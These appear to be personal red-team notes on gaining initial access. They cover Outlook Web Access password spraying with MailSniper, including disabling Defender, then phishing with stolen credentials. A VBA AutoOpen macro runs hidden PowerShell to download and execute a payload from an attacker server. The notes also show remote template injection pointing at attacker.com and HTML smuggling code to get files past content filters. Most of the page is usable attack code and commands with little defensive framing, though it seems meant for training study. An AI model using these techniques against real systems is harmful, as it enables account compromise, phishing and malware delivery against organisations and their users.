# Initial Compromise Notes

**Password Spraying**
I have a love/hate relationship with password spraying. Anyways, tools like [MailSniper](https://github.com/dafthack/MailSniper) or [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) can help.

Import MailSniper, turn off defenders real-time protection for this.
```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Enumerate NetBIOS name of target domain with Invoke-DomainHarvestOWA from MailSniper. I find you can also enumerate this with nmap-ing smb of devices on a domain. Although that's more from doing labs so probably more usefull for ctf's, don't recommend because port scanning is really loud.
```
Invoke-DomainHarvestOWA -ExchHostname <domain>
```

Not talked about yet, but check the websites for possible users or social media, add their names into an arbitrary file like names.txt for us to use a tool like namemash.py that turns this name into possible username permutations. 
```
./namemash.py names.txt > possible.txt
```

Now we can use Invoke-UsernameHarvestOWA to enumerate for possible users using this possible.txt and the NetBIOS we enumerated from before.
```
Invoke-UsernameHarvestOWA -ExchHostname <email subdomain> -Domain <domain> -UserList possible.txt -OutFile valid.txt
```

Now password spray, you can get easy to test passwords from places like [weakpasswords.net](https://weakpasswords.net/)
```
Invoke-PasswordSprayOWA -ExchHostname <email subdomain> -userList valid.txt -Password <password>
```

MailSniper has other functions like downloading the glabal address list
```
Get-GlobalAddressList -ExchHostname <mail subdomain> -UserName <domain\poppedUser -Password <password found> -OutFile gal.txt
```

**internal phishing**
With user creds you could just go to that email subdomain through a browser and logging in and sending phishing emails like that. 

**Initial Access Payloads**
You can attach a payload in the email or send a url where to download the malicious file. MOTW exists for any files downloaded via a browser which makes the file look untrusted. 

## VBA Macros
We can use VBA Macros to exist code using microsoft office. Open word on the attacker desktop go to View>Macros>Create. Change the "Macros in" field from "All active templates and documents" to "Document 1". Give the macros a name and save it. To have it execute on open use AutoOpen, in the below it will download a powershell payload from beacon that we set up. The /a is the powershell payload URI, and the attackerserver is the teamserver we are using to host this. You can check beacon payloads in command and control to review this.  
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<attackerserver>/a'))"""

End Sub
```
Remove username of your system from being embedded in document

*File>Info>Inspect Document>Inspect Document*
Click *Inspect* > *Remove All* next to *Document Properties and Personal Information* 

Next save the word document with the macro as a *Word 97-2003(.doc)*

Then upload to teamserver by going to *Site management > Host File*

Attach the file in an email and send to targets. A user will need to click *Enable Editing* and then *Enable Content* to execute the macro.

If executed you will receive a new beacon in Cobalt Strike.

## Remote Template Injection
Remote template injection is where you trick a user to open a document that downloads a malicious template. 

Steps to follow
1. Save the malicious macro file as a *Word 97-2003(.dot) file as your injection template
2. Host this template in teamserver Cobalt Strike like above
3. Create a new document from the blank template located in *C:\Users\Attacker\Documents\Custom Office Templates* as a .docx file.
4. Right click this file in file explorer and select *7-zip>Open archive*
5. Navigate to *word>_rels*
6. Right click to Open and Edit the settings.xml.rels
7. Scroll until you find the *Target* entry and change this to your teamservers malicious .dot file
   ```
   Target="http://attacker.com/template.dot"
   ```
8. Save this and email the target the document

A lot of this can be done with this the [remoteinjector](https://github.com/JohnWoodman/remoteinjector) tool

## HTML Smuggling
A technique to use JavaScript to hide files from content fiters.

Example HTML smuggling code
```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```
This still gets the MOTW on it as it was downloaded over the internet
